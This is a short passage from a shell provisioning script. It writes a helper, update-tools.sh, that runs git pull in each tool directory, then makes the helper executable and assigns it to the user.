    cd "$dir" && git pull && cd ..
done

echo "[+] Done!"
UPDATE_EOF
    chmod +x "$USER_HOME/scripts/update-tools.sh"
    chown "$USERNAME":"$USERNAME" "$USER_HOME/scripts/update-tools.sh"
